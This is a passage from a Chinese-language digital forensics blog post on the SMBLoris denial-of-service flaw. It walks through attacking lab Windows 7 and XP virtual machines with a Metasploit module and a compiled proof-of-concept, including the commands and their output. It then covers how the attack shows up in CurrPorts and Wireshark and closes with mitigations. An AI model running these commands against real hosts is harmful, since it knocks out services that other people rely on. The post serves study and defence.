class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds</span><br><span class="line">3389/tcp open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-smbloris: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Denial of service attack against Microsoft Windows SMB servers (SMBLoris)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: HIGH  CVSSv3: 8.2 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)</span><br><span class="line">|       All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.</span><br><span class="line">|       </span><br><span class="line">|     Disclosure date: 2017-08-1</span><br><span class="line">|     References:</span><br><span class="line">|_      http://smbloris.com/</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 192.63 seconds</span><br></pre></td></tr></table></figure></div>
+<h4 id="4-攻擊">4.攻擊</h4>
+<p>這次的攻擊有兩種實行的做法</p>
+<p>一是利用<em>metaspolit</em>示範攻擊<strong>Win 7主機</strong><br>
+這個漏洞在win7上能看到比較明顯的變化</p>
+<p>二是利用<em>PoC</em>來達成示範攻擊<strong>XP主機</strong><br>
+<a href="https://packetstormsecurity.com/files/143636/SMBLoris-Denial-Of-Service.html" target="_blank" rel="noopener">這裡有關於PoC的詳細說明</a></p>
+<h5 id="利用metaspolit">利用<em>metaspolit</em></h5>
+<ol>
+<li>
+<p>設定系統的limit<br>
+由於這個攻擊會同時開啟很多連接<br>
+所以我們要先單獨更改shell能同時開啟的file<br>
+才能讓我們同時開很多Port占用對方資源(當然同時我們的電腦也要撐得住才行 <img class="emoji lazyload" draggable="false" alt="😛" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f61b.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>
+<a href="https://bit.ly/3hDJFiK" target="_blank" rel="noopener">參考這篇的說明</a><br>
+<code>$ ulimit -n 65535</code></p>
+</li>
+<li>
+<p>search</p>
+</li>
+</ol>
+<pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; search smbloris
+
+Matching Modules
+================
+
+   #  Name                         Disclosure Date  Rank    Check  Description
+   -  ----                         ---------------  ----    -----  -----------
+   0  auxiliary/dos/smb/smb_loris  2017-06-29       normal  No     <span style="background-color:#9755B3">SMBLoris</span> NBSS Denial of Service
+
+
+Interact with a module by name or index. For example <font color="#5EBDAB">info 0</font>, <font color="#5EBDAB">use 0</font> or <font color="#5EBDAB">use auxiliary/dos/smb/smb_loris</font>
+</pre>
+<ol start="3">
+<li>use 與 設定選項</li>
+</ol>
+<pre><u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; use 0
+<u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; options
+
+Module options (auxiliary/dos/smb/smb_loris):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   rhost  192.168.85.131   yes       The target address
+   rport  445              yes       SMB port on the target
+
+<u style="text-decoration-style:single">msf6</u> auxiliary(<font color="#EC0101"><b>dos/smb/smb_loris</b></font>) &gt; set rhost 192.168.85.131
+rhost =&gt; 192.168.85.131
+</pre>
+<ol start="4">
+<li>攻擊<br>
+此時我們輸入<code>run</code>便可進行攻擊<br>
+要注意的是，這個攻擊不會自動結束，要手動關閉<br>
+因為這個模組會試圖保持連接</li>
+</ol>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(dos/smb/smb_loris) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Starting server...</span><br><span class="line">[*] 192.168.85.131:445 - 100 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 200 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 300 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 400 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 500 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 600 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 700 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 800 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 900 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - 1000 socket(s) open</span><br><span class="line">跳過一點....</span><br><span class="line">[*] 192.168.85.131:445 - 3900 socket(s) open</span><br><span class="line">[!] 192.168.85.131:445 - At open socket limit with 3995 sockets open. Try increasing your system limits.</span><br><span class="line">[*] 192.168.85.131:445 - 3995 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - Holding steady at 3995 socket(s) open</span><br><span class="line">[*] 192.168.85.131:445 - Holding steady at 3995 socket(s) open</span><br></pre></td></tr></table></figure></div>
+<a href="https://imgur.com/PoZcqRf.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/PoZcqRf.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a>
+<p>至此，本次攻擊成功<br>
+這邊由於示範沒有讓他跑滿，若跑滿<em>65536</em>個PORT<br>
+可以吞掉大約8GB左右的記憶體<br>
+<a href="https://imgur.com/7tg8zNc.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/7tg8zNc.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a><br>
+圖片來自<a href="https://web.archive.org/web/20190329104319/http://smbloris.com/" target="_blank" rel="noopener">官網</a></p>
+<hr>
+<h5 id="利用PoC">利用PoC</h5>
+<p>雖然都叫PoC了，代表不是正式的攻擊工具<br>
+不過在我的情況下，這個工具才對我的XP系統在<strong>CPU</strong>有比較明顯的反應<br>
+Win 7更誇張了，會導致UI整個卡住<img class="emoji lazyload" draggable="false" alt="🤣" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f923.png" src="https://i.imgur.com/WS5Q2x3.gif"></p>
+<ol>
+<li>進行編譯<br>
+<code>$ gcc -o smbloris smbloris.c</code></li>
+<li>攻擊<br>
+我們來看一下格式</li>
+</ol>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./smbloris</span></span><br><span class="line">Usage: ./smbloris &lt;iface&gt; &lt;src_ip_start&gt; &lt;src_ip_end&gt; &lt;dst_ip&gt;</span><br></pre></td></tr></table></figure></div>
+<p>這邊我們source IP暫時先設別組<br>
+如果設定我們自己的話，可能會被reply炸掉</p>
+<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo ./smbloris eth0 192.168.0.0 192.168.0.255 192.168.85.129</span></span><br><span class="line">Local MAC address: 00:0c:29:18:1d:29</span><br><span class="line">c0a80012:9196 1216900 sent, 0 errors (0), 0 replies, 0 resets^C</span><br></pre></td></tr></table></figure></div>
+<a href="https://imgur.com/axwAzsa.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/axwAzsa.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a>
+<p>至此，本次攻擊成功<br>
+不知道為甚麼，有股SYN Flooding的既視感<br>
+不過跟Win 7有些不同，主要是CPU占用較為明顯<br>
+有關<strong>記憶體</strong>的主要部分反而沒有明顯的反應</p>
+<hr>
+<h2 id="鑑識">鑑識</h2>
+<h4 id="需先準備軟體-v2">需先準備軟體</h4>
+<ol>
+<li><strong>Wireshark</strong></li>
+<li><strong>CurrPorts</strong></li>
+</ol>
+<p>這次多了一套新軟體，CurrPorts是一款輕量級簡潔的小工具<br>
+可用來查看有哪些Port被程式使用</p>
+<p>由於這次有兩部主機，所以各談各自的資料</p>
+<h4 id="Win-7">Win 7</h4>
+<p>首先我們可以從Currports看到<br>
+有大量來自 <strong>(Kali)</strong> 192.168.85.130已建立的連線<br>
+<a href="https://imgur.com/RgvEnAn.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/RgvEnAn.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p>
+<p>在WireShark中也可以看到<br>
+有大量來自MAC位置 <strong>(Kali)</strong> <code>VMware_18:1d:29 (00:0c:29:18:1d:29)</code> 往 <strong>(Win 7)</strong> <code>VMware_4d:0a:b6 (00:0c:29:4d:0a:b6)</code> 的封包<br>
+<a href="https://imgur.com/vuWHCAz.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/vuWHCAz.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p>
+<h4 id="Win-XP">Win XP</h4>
+<p>首先我們可以從Currports看到<br>
+有大量來自<strong>不存在</strong>的IP連線<br>
+這邊跟上面不同的是，連接並沒有被建立，對方(攻擊端)沒有給予回應<br>
+<a href="https://imgur.com/fXL9wWr.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/fXL9wWr.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p>
+<p>在WireShark中也可以看到<br>
+有大量來自MAC位置 <strong>(Kali)</strong> <code>VMware_18:1d:29 (00:0c:29:18:1d:29)</code> 往 <strong>(Win XP)</strong> <code>Vmware_e3:ab:54 (00:0c:29:e3:ab:54)</code> 的封包<br>
+<a href="https://imgur.com/xhdRRkN.jpg" target="_blank" rel="noopener" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="https://imgur.com/xhdRRkN.jpg" src="https://i.imgur.com/WS5Q2x3.gif" class="lazyload"></a></p>
+<hr>
+<h2 id="解決方法">解決方法</h2>
+<p>目前這個漏洞，Microsoft似乎沒有想要修復的意思<img class="emoji lazyload" draggable="false" alt="😅" data-src="https://twemoji.maxcdn.com/v/12.1.6/72x72/1f605.png" src="https://i.imgur.com/WS5Q2x3.gif"><br>
+因為這個漏洞除了能透過防火牆直接封鎖外<br>
+加上SMB服務通常只開放於內網<br>
+所以這個漏洞也沒有CVE編號</p>
+<p>所以首要的動作是，想盡辦法限制此服務只能夠於內網使用<br>
+<strong>禁止外網連接Port 139, 445</strong></p>
+<h4 id="1">1.</h4>
+<p>在windows這個漏洞麻煩的是，就算你關閉<em>SMB v1, v2, v3</em>服務也能夠被觸發<br>
+得直接把相關的<strong>Port 139, 445給都關閉</strong>才行<br>
+或是限制<strong>單個IP能夠打開的連接</strong></p>
+<h4 id="2">2.</h4>
+<p>在Linux的Samba部分的話，可透過設定smb.conf<br>
+<code>max smbd processes = 1000</code><br>
+來限制系統可建立的連接</p>
+<h2 id="參考資料來源">參考資料來源</h2>
+<p><a href="https://web.archive.org/web/20190329104319/http://smbloris.com/" target="_blank" rel="noopener">SMBLoris Windows Denial of Service Vulnerability(官網)</a><br>
+<a href="https://red.ht/3hHtfWA" target="_blank" rel="noopener">SMBLoris: Remote Denial-of-Service Against Samba - Red Hat Customer Portal</a><br>
+<a href="https://bit.ly/35OmaAT" target="_blank" rel="noopener">SMBLoris - An SMB DoS Vulnerability - SecPod Blog</a><br>
+<a href="https://bit.ly/3CheN0T" target="_blank" rel="noopener">SMBLoris NBSS Denial of Service - Metasploit - InfosecMatter</a><br>
+<a href="https://samsclass.info/124/proj14/smbl.htm" target="_blank" rel="noopener">SMBLoris Attack</a><br>
+<a href="https://twitter.com/marcan42/status/892716247502082051" target="_blank" rel="noopener">SMBLoris attack proof of concept: brings down my fully patched Win10 box in seconds.</a><br>
+<a href="https://bit.ly/3Kin1ca" target="_blank" rel="noopener">SMBLoris Denial Of Service ≈ Packet Storm</a><br>
+<a href="https://www.rapid7.com/blog/post/2017/08/03/smbloris-what-you-need-to-know/" target="_blank" rel="noopener">SMBLoris: What You Need To Know | Rapid7 Blog</a><br>
+<a href="https://gist.github.com/marcan/6a2d14b0e3eaa5de1795a763fb58641e" target="_blank" rel="noopener">SMBLoris PoC</a><br>
+<a href="https://read01.com/4DGJJjO.html" target="_blank" rel="noopener">CNNVD關於Windows SMBLoris漏洞情況的通報</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SUSU</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章鏈接: </span><span class="post-copyright-info"><a href="https://sunick2009.github.io/2022/03/05/digital_forensics_2022_03_05/">https://sunick2009.github.io/2022/03/05/digital_forensics_2022_03_05/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版權聲明: </span><span class="post-copyright-info">本博客所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 許可協議。轉載請註明來自 <a href="https://sunick2009.github.io" target="_blank">SUSU's BLOG</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Digital-forensics/">Digital forensics    </a><a class="post-meta__tags" href="/tags/Linux/">Linux    </a></div><div class="post_share"><div class="social-share" data-image="https://imgur.com/ZbnCCYY.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination_post" id="pagination"><div class="next-post pull-full"><a href="/2021/12/05/digital_forensics_2021_12_05/"><img class="next_cover lazyload" data-src="https://imgur.com/4WtLHTa.jpg" onerror="onerror=null;src='https://imgur.com/ED0wFaA.jpg'"><div class="label">下一篇</div><div class="next_info"><span>數位鑑識筆記 - Shellshock</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相關推薦</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021/12/05/digital_forensics_2021_12_05/" title="數位鑑識筆記 - Shellshock"><img class="relatedPosts_cover lazyload"data-src="https://imgur.com/4WtLHTa.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-12-05</div><div class="relatedPosts_title">數位鑑識筆記 - Shellshock</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 評論</span></div><div class="vcomment" id="vcomment"></div><script src="https://cdn.jsdelivr.net/gh/xaoxuu/volantis/js/volantis.min.js"></script><script>var notify = false == true ? true : false;
+var verify = false == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = '暱稱,電郵,連結'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'9AhbD7NaCezDIb0Y8pBilq0q-MdYXbMMI',
+  appKey:'a6JCosocPJwjM7wmeyg25PHM',
+  placeholder:'Please leave your footprints',
+  avatar:'monsterid',
+  guest_info:guest_info,
+  pageSize:'10',
+  lang:'en',
+  recordIP: true
+});</script></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By SUSU</div><div class="framework-info"><span>Power by </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="閲讀模式"></i><i class="fa fa-plus" id="font_plus" title="放大字體"></i><i class="fa fa-minus" id="font_minus" title="縮小字體"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="簡繁轉換" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜間模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="設置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直達評論"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目錄" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到頂部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="canvas_nest" color="90,63,170" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/gh/jerryc127/butterfly_cdn@2.1.0/js/canvas-nest.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
